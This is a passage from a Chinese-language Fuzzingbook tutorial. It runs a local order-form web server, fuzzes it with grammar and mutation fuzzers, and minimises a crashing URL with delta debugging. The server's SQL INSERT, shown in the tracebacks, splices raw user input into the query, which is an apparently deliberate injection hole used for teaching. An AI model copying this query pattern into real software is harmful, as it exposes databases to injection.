        message = HTML_INTERNAL_SERVER_ERROR.format(error_message=exc)
        self.wfile.write(message.encode("utf8")) 
```

#### 记录

我们的服务器作为后台的独立进程运行，随时等待接收命令。为了查看它在做什么，我们实现了一个特殊的日志记录机制。`httpd_message_queue`建立了一个队列，其中一个进程（服务器）可以存储 Python 对象，另一个进程（笔记本）可以检索它们。我们使用它将日志消息从服务器传递过来，然后我们可以在笔记本中显示这些消息。

对于多进程，我们使用 `multiprocess` 模块——这是标准 Python `multiprocessing` 模块的变体，它也适用于笔记本。如果您在笔记本外运行此代码，您也可以使用 `multiprocessing`。

```py
from [multiprocess](https://pypi.org/project/multiprocess/) import Queue 
```

```py
HTTPD_MESSAGE_QUEUE = Queue() 
```

让我们在队列中放置两条消息：

```py
HTTPD_MESSAGE_QUEUE.put("I am another message") 
```

```py
HTTPD_MESSAGE_QUEUE.put("I am one more message") 
```

为了区分服务器消息和其他笔记本部分，我们特别格式化它们：

```py
from [bookutils](https://github.com/uds-se/fuzzingbook//tree/master/notebooks/shared/bookutils) import rich_output, terminal_escape 
```

```py
def display_httpd_message(message: str) -> None:
    if rich_output():
        display(
            HTML(
                '<pre style="background: NavajoWhite;">' +
                message +
                "</pre>"))
    else:
        print(terminal_escape(message)) 
```

```py
display_httpd_message("I am a httpd server message") 
```

```py
I am a httpd server message
```

`print_httpd_messages()` 方法打印到目前为止队列中积累的所有消息：

```py
def print_httpd_messages():
    while not HTTPD_MESSAGE_QUEUE.empty():
        message = HTTPD_MESSAGE_QUEUE.get()
        display_httpd_message(message) 
```

```py
import [time](https://docs.python.org/3/library/time.html) 
```

```py
time.sleep(1)
print_httpd_messages() 
```

```py
I am another message
```

```py
I am one more message
```

使用 `clear_httpd_messages()`，我们可以静默地丢弃所有挂起的消息：

```py
def clear_httpd_messages() -> None:
    while not HTTPD_MESSAGE_QUEUE.empty():
        HTTPD_MESSAGE_QUEUE.get() 
```

请求处理器中的 `log_message()` 方法利用队列来存储其消息：

```py
class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format: str, *args) -> None:
        message = ("%s - - [%s] %s\n" %
                   (self.address_string(),
                    self.log_date_time_string(),
                    format % args))
        HTTPD_MESSAGE_QUEUE.put(message) 
```

在雕刻章节中，我们介绍了一个 `webbrowser()` 方法，它检索给定 URL 的内容。我们现在扩展它，使其也能打印出服务器产生的任何日志消息：

```py
import [requests](http://docs.python-requests.org/en/master/) 
```

```py
def webbrowser(url: str, mute: bool = False) -> str:
  """Download and return the http/https resource given by the URL"""

    try:
        r = requests.get(url)
        contents = r.text
    finally:
        if not mute:
            print_httpd_messages()
        else:
            clear_httpd_messages()

    return contents 
```

使用 `webbrowser()`，我们现在已经准备好让网络服务器启动并运行。</details>

### 运行服务器

我们在本地主机上运行服务器——即运行此笔记本的同一台机器。我们检查可用的端口并将生成的 URL 放入之前创建的队列中。

```py
def run_httpd_forever(handler_class: type) -> NoReturn:
    host = "127.0.0.1"  # localhost IP
    for port in range(8800, 9000):
        httpd_address = (host, port)

        try:
            httpd = HTTPServer(httpd_address, handler_class)
            break
        except OSError:
            continue

    httpd_url = "http://" + host + ":" + repr(port)
    HTTPD_MESSAGE_QUEUE.put(httpd_url)
    httpd.serve_forever() 
```

`start_httpd()` 函数在单独的进程中启动服务器，我们使用 `multiprocess` 模块来启动它。它从消息队列中检索其 URL 并返回它，这样我们就可以开始与服务器通信。

```py
from [multiprocess](https://pypi.org/project/multiprocess/) import Process 
```

```py
def start_httpd(handler_class: type = SimpleHTTPRequestHandler) \
        -> Tuple[Process, str]:
    clear_httpd_messages()

    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))
    httpd_process.start()

    httpd_url = HTTPD_MESSAGE_QUEUE.get()
    return httpd_process, httpd_url 
```

现在我们开始服务器并保存其 URL：

```py
httpd_process, httpd_url = start_httpd()
httpd_url 
```

```py
'http://127.0.0.1:8800'

```

### 与服务器交互

现在我们来访问刚刚创建的服务器。

#### 直接浏览器访问

如果您也在本地主机上运行 Jupyter 笔记本服务器，您现在可以直接在给定的 URL 访问服务器。只需通过点击下面的链接在 `httpd_url` 中打开地址。

**注意**：这仅在您在本地主机上运行 Jupyter 笔记本服务器时才有效。

```py
def print_url(url: str) -> None:
    if rich_output():
        display(HTML('<pre><a href="%s">%s</a></pre>' % (url, url)))
    else:
        print(terminal_escape(url)) 
```

```py
print_url(httpd_url) 
```

```py
http://127.0.0.1:8800
```

更方便的是，您可能可以直接使用下面的窗口与服务器交互。

**注意**：这仅在您在本地主机上运行 Jupyter 笔记本服务器时才有效。

```py
from [IPython.display](https://ipython.readthedocs.io/en/stable/api/generated/IPython.display.html) import IFrame 
```

```py
IFrame(httpd_url, '100%', 230) 
```

交互后，您可以检索服务器产生的消息：

```py
print_httpd_messages() 
```

我们还可以查看在 `orders` 数据库（`db`）中放置的任何订单：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[]

```

我们还可以清除订单数据库：

```py
db.execute("DELETE FROM orders")
db.commit() 
```

#### 获取主页

即使我们的浏览器不能直接与服务器交互，笔记本也可以。例如，我们可以检索主页的内容并将其显示出来：

```py
contents = webbrowser(httpd_url) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:25] "GET / HTTP/1.1" 200 -

```

```py
HTML(contents) 
```

#### 下订单

为了测试这个表单，我们可以生成带有订单的 URL 并让服务器处理它们。

`urljoin()` 方法将基本 URL（即我们服务器的 URL）和路径组合在一起——比如说，指向我们订单的路径。

```py
from [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) import urljoin, urlsplit 
```

```py
urljoin(httpd_url, "/order?foo=bar") 
```

```py
'http://127.0.0.1:8800/order?foo=bar'

```

使用 `urljoin()`，我们可以创建一个完整的 URL，它与我们在提交订单表单时浏览器生成的 URL 相同。将此 URL 发送到浏览器实际上就是下订单，正如我们可以在服务器日志中看到的那样：

```py
contents = webbrowser(urljoin(httpd_url,
                              "/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104")) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:25] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:25] "GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1" 200 -

```

返回的网页确认了订单：

```py
HTML(contents) 
```

**感谢您的 Fuzzingbook 订单！**

我们将向西雅图 Jane Doe（邮编 98104）发送**一件 FuzzingBook T 恤**。

将确认邮件发送到 doe@example.com。

想要更多潮品？使用我们的订单表单！

订单也已在数据库中：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')]

```

#### 错误信息

我们还可以测试服务器是否正确响应无效请求。例如，不存在的页面被正确处理：

```py
HTML(webbrowser(urljoin(httpd_url, "/some/other/path"))) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:25] "GET /some/other/path HTTP/1.1" 404 -

```

**抱歉。**

这个页面不存在。请尝试我们的订单表单。

你可能还记得我们还有一个关于内部服务器错误的页面。我们能让服务器生成这个页面吗？为了找出答案，我们必须彻底测试服务器——这将在本章的剩余部分进行。

## 模糊测试输入表单

在设置并启动服务器后，我们现在可以系统地测试它——首先使用预期值，然后使用不太预期的值。

### 使用预期值进行模糊测试

由于所有订单都是通过创建适当的 URL 来完成的，我们定义了一个语法 `ORDER_GRAMMAR` 来编码订单 URL。它包含一些用于姓名、电子邮件地址、城市和（随机）数字的样本值。

<details id="Excursion:-Implementing-cgi_decode()"><summary>实现 cgi_decode()</summary>

为了使定义成为 URL 部分字符串更容易，我们定义了 `cgi_encode()` 函数，它接受一个字符串并将其自动编码为 CGI：

```py
import [string](https://docs.python.org/3/library/string.html) 
```

```py
def cgi_encode(s: str, do_not_encode: str = "") -> str:
    ret = ""
    for c in s:
        if (c in string.ascii_letters or c in string.digits
                or c in "$-_.+!*'()," or c in do_not_encode):
            ret += c
        elif c == ' ':
            ret += '+'
        else:
            ret += "%%%02x" % ord(c)
    return ret 
```

```py
s = cgi_encode('Is "DOW30" down .24%?')
s 
```

```py
'Is+%22DOW30%22+down+.24%25%3f'

```

可选参数 `do_not_encode` 允许我们跳过编码中的某些字符。这在编码语法规则时很有用：

```py
cgi_encode("<string>@<string>", "<>") 
```

```py
'<string>%40<string>'

```

`cgi_encode()` 是在覆盖率章节中定义的 `cgi_decode()` 函数的精确对应物：

```py
from Coverage import cgi_decode  # minor dependency 
```

```py
cgi_decode(s) 
```

```py
'Is "DOW30" down .24%?'

```</details>

在语法中，我们使用 `cgi_encode()` 对字符串进行编码：

```py
from Grammars import crange, is_valid_grammar, syntax_diagram, Grammar 
```

```py
ORDER_GRAMMAR: Grammar = {
    "<start>": ["<order>"],
    "<order>": ["/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>"],
    "<item>": ["tshirt", "drill", "lockset"],
    "<name>": [cgi_encode("Jane Doe"), cgi_encode("John Smith")],
    "<email>": [cgi_encode("j.doe@example.com"), cgi_encode("j_smith@example.com")],
    "<city>": ["Seattle", cgi_encode("New York")],
    "<zip>": ["<digit>" * 5],
    "<digit>": crange('0', '9')
} 
```

```py
assert is_valid_grammar(ORDER_GRAMMAR) 
```

```py
syntax_diagram(ORDER_GRAMMAR) 
```

```py
start

```

<svg class="railroad-diagram" height="62" viewBox="0 0 182.5 62" width="182.5"><g transform="translate(.5 .5)"><g><g><g class="non-terminal"><text x="91.25" y="35">order</text></g></g></g></g></svg>

```py
order

```

<svg class="railroad-diagram" height="62" viewBox="0 0 976.0 62" width="976.0"><g transform="translate(.5 .5)"><g><g><g class="terminal"><text x="121.0" y="35">/order?item=</text></g> <g class="non-terminal"><text x="229.0" y="35">item</text></g> <g class="terminal"><text x="311.5" y="35">&name=</text></g> <g class="non-terminal"><text x="394.0" y="35">name</text></g> <g class="terminal"><text x="480.75" y="35">&email=</text></g> <g class="non-terminal"><text x="571.75" y="35">email</text></g> <g class="terminal"><text x="658.5" y="35">&city=</text></g> <g class="non-terminal"><text x="741.0" y="35">city</text></g> <g class="terminal"><text x="819.25" y="35">&zip=</text></g> <g class="non-terminal"><text x="893.25" y="35">zip</text></g></g></g></g></svg>

```py
item

```

<svg class="railroad-diagram" height="122" viewBox="0 0 199.5 122" width="199.5"><g transform="translate(.5 .5)"><g><g><g class="terminal"><text x="99.75" y="35">tshirt</text></g></g> <g><g class="terminal"><text x="99.75" y="65">drill</text></g></g> <g><g class="terminal"><text x="99.75" y="95">lockset</text></g></g></g></g></svg>

```py
name

```

<svg class="railroad-diagram" height="92" viewBox="0 0 225.0 92" width="225.0"><g transform="translate(.5 .5)"><g><g><g class="terminal"><text x="112.5" y="35">Jane+Doe</text></g></g> <g><g class="terminal"><text x="112.5" y="65">John+Smith</text></g></g></g></g></svg>

```py
email

```

<svg class="railroad-diagram" height="92" viewBox="0 0 318.5 92" width="318.5"><g transform="translate(.5 .5)"><g><g><g class="terminal"><text x="159.25" y="35">j.doe%40example.com</text></g></g> <g><g class="terminal"><text x="159.25" y="65">j_smith%40example.com</text></g></g></g></g></svg>

```py
city

```

<svg class="railroad-diagram" height="92" viewBox="0 0 208.0 92" width="208.0"><g transform="translate(.5 .5)"><g><g><g class="terminal"><text x="104.0" y="35">Seattle</text></g></g> <g><g class="terminal"><text x="104.0" y="65">New+York</text></g></g></g></g></svg>

```py
zip

```

<svg class="railroad-diagram" height="62" viewBox="0 0 512.5 62" width="512.5"><g transform="translate(.5 .5)"><g><g><g class="non-terminal"><text x="91.25" y="35">digit</text></g> <g class="non-terminal"><text x="173.75" y="35">digit</text></g> <g class="non-terminal"><text x="256.25" y="35">digit</text></g> <g class="non-terminal"><text x="338.75" y="35">digit</text></g> <g class="non-terminal"><text x="421.25" y="35">digit</text></g></g></g></g></svg>

```py
digit

```

<svg class="railroad-diagram" height="109" viewBox="0 0 522.5 109" width="522.5"><g transform="translate(.5 .5)"><g><g><g><g class="terminal"><text x="84.25" y="43">0</text></g></g> <g><g class="terminal"><text x="84.25" y="73">1</text></g></g></g> <g><g><g class="terminal"><text x="172.75" y="43">2</text></g></g> <g><g class="terminal"><text x="172.75" y="73">3</text></g></g></g> <g><g><g class="terminal"><text x="261.25" y="43">4</text></g></g> <g><g class="terminal"><text x="261.25" y="73">5</text></g></g></g> <g><g><g class="terminal"><text x="349.75" y="43">6</text></g></g> <g><g class="terminal"><text x="349.75" y="73">7</text></g></g></g> <g><g><g class="terminal"><text x="438.25" y="43">8</text></g></g> <g><g class="terminal"><text x="438.25" y="73">9</text></g></g></g></g></g></svg>

使用我们的语法模糊器之一，我们可以实例化此语法并生成 URL：

```py
from GrammarFuzzer import GrammarFuzzer 
```

```py
order_fuzzer = GrammarFuzzer(ORDER_GRAMMAR)
[order_fuzzer.fuzz() for i in range(5)] 
```

```py
['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=New+York&zip=42436',
 '/order?item=drill&name=John+Smith&email=j_smith%40example.com&city=New+York&zip=56213',
 '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=63628',
 '/order?item=drill&name=John+Smith&email=j.doe%40example.com&city=Seattle&zip=59538',
 '/order?item=drill&name=Jane+Doe&email=j_smith%40example.com&city=New+York&zip=41160']

```

将这些 URL 发送到服务器将正确处理它们：

```py
HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz()))) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=lockset&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=16631 HTTP/1.1" 200 -

```

**感谢您的模糊测试书订单！**

我们将向西雅图的 Jane Doe 发送**一个模糊测试书锁套件**，地址为 16631

将向 j_smith@example.com 发送确认邮件。

想要更多潮品？使用我们的订单表单！

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')]

```

### 使用意外值进行模糊测试

我们现在可以看到，当面对“标准”值时，服务器做得很好。但如果我们给它非标准值会发生什么？为此，我们使用一个突变模糊器在 URL 中插入随机更改。我们的种子（即要变异的值）来自语法模糊器：

```py
seed = order_fuzzer.fuzz()
seed 
```

```py
'/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'

```

修改这个字符串不仅会在字段值中产生突变，还会在字段名以及 URL 结构中产生突变。

```py
from MutationFuzzer import MutationFuzzer  # minor deoendency 
```

```py
mutate_order_fuzzer = MutationFuzzer([seed], min_mutations=1, max_mutations=1)
[mutate_order_fuzzer.fuzz() for i in range(5)] 
```

```py
['/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',
 '/order?item=drill&name=Jane+Doe&email=.doe%40example.com&city=Seattle&zip=45732',
 '/order?item=drill;&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',
 '/order?item=drill&name=Jane+Doe&emil=j.doe%40example.com&city=Seattle&zip=45732',
 '/order?item=drill&name=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=4732']

```

让我们稍微模糊一下，直到我们得到一个内部服务器错误。我们使用 Python 的 `requests` 模块与 Web 服务器交互，以便我们可以直接访问 HTTP 状态码。

```py
while True:
    path = mutate_order_fuzzer.fuzz()
    url = urljoin(httpd_url, path)
    r = requests.get(url)
    if r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
        break 
```

这没有花很长时间。这是有问题的 URL：

```py
url 
```

```py
'http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'

```

```py
clear_httpd_messages()
HTML(webbrowser(url)) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732 HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'name'

```

**内部服务器错误**

服务器遇到了内部错误。请访问我们的订单表单。

```py
Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'name'

```

这个 URL 如何导致这个内部错误？我们使用 delta debugging 来最小化导致失败的路径，设置一个 `WebRunner` 类来定义失败条件：

```py
failing_path = path
failing_path 
```

```py
'/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'

```

```py
from Fuzzer import Runner 
```

```py
class WebRunner(Runner):
  """Runner for a Web server"""

    def __init__(self, base_url: Optional[str] = None):
        self.base_url = base_url

    def run(self, url: str) -> Tuple[str, str]:
        if self.base_url is not None:
            url = urljoin(self.base_url, url)

        import [requests](http://docs.python-requests.org/en/master/)  # for imports
        r = requests.get(url)
        if r.status_code == HTTPStatus.OK:
            return url, Runner.PASS
        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:
            return url, Runner.FAIL
        else:
            return url, Runner.UNRESOLVED 
```

```py
web_runner = WebRunner(httpd_url)
web_runner.run(failing_path) 
```

```py
('http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',
 'FAIL')

```

这是最小化路径：

```py
from Reducer import DeltaDebuggingReducer  # minor 
```

```py
minimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)
minimized_path 
```

```py
'order'

```

结果表明，如果我们不提供请求的字段，我们的服务器会遇到内部错误：

```py
minimized_url = urljoin(httpd_url, minimized_path)
minimized_url 
```

```py
'http://127.0.0.1:8800/order'

```

```py
clear_httpd_messages()
HTML(webbrowser(minimized_url)) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /doe%40example.com&city=Seattle&zip=45732 HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&nae=Jane+Doe&email=j. HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'name'

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /ae=Jane+Doe&email=j. HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&n HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'name'

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /em=drill&n HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?it HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /er?it HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /ord HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /rder?it HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /oer?it HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /ord?it HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /rder HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /oer HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /oder HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /orer HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /ordr HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /orde HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order HTTP/1.1" 500 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

**内部服务器错误**

服务器遇到了内部错误。请访问我们的订单表单.

```py
Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/3183845167.py", line 8, in do_GET
    self.handle_order()
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1342827050.py", line 4, in handle_order
    self.store_order(values)
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_53958/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyError: 'item'

```

我们看到，为了使我们的 Web 服务器更能抵御意外的输入，我们可能还有很多工作要做。练习提供了一些操作指南。

## 提取输入表单的语法

在我们之前的例子中，我们假设我们有一个可以生成有效（或不太有效）的顺序查询的语法。然而，这样的语法不需要手动指定；我们也可以从手头的网页中自动*提取*它。这样，我们可以在不进行手动指定步骤的情况下，将我们的测试生成器应用于任意的 Web 表单。

### 在 HTML 中搜索输入字段

我们方法的关键思想是识别表单中的所有输入字段。为此，让我们看看我们的订单表单中的各个元素是如何在 HTML 中编码的：

```py
html_text = webbrowser(httpd_url)
print(html_text[html_text.find("<form"):html_text.find("</form>") + len("</form>")]) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET / HTTP/1.1" 200 -

```

```py
<form action="/order" style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Fuzzingbook Swag Order Form</strong>
  <p>
  Yes! Please send me at your earliest convenience
  <select name="item">
  <option value="tshirt">One FuzzingBook T-Shirt</option>
<option value="drill">One FuzzingBook Rotary Hammer</option>
<option value="lockset">One FuzzingBook Lock Set</option>

  </select>
  <br>
  <table>
  <tr><td>
  <label for="name">Name: </label><input type="text" name="name">
  </td><td>
  <label for="email">Email: </label><input type="email" name="email"><br>
  </td></tr>
  <tr><td>
  <label for="city">City: </label><input type="text" name="city">
  </td><td>
  <label for="zip">ZIP Code: </label><input type="number" name="zip">
  </tr></tr>
  </table>
  <input type="checkbox" name="terms"><label for="terms">I have read
  the <a href="/terms">terms and conditions</a></label>.<br>
  <input type="submit" name="submit" value="Place order">
</p>
</form>

```

我们看到有许多表单元素可以接受输入，特别是 `<input>`，但也包括 `<select>` 和 `<option>`。现在的想法是*解析*相关网页的 HTML，提取这些单独的输入元素，然后创建一个*语法*，生成匹配的 URL，从而有效地填写表单。

要解析 HTML 页面，我们可以定义一个解析 HTML 的语法并使用我们自己的解析器基础设施。然而，不重新发明轮子，而是基于现有的、专门的 `HTMLParser` 类库中的 `HTMLParser` 类要容易得多。

```py
from [html.parser](https://docs.python.org/3/library/html.parser.html) import HTMLParser 
```

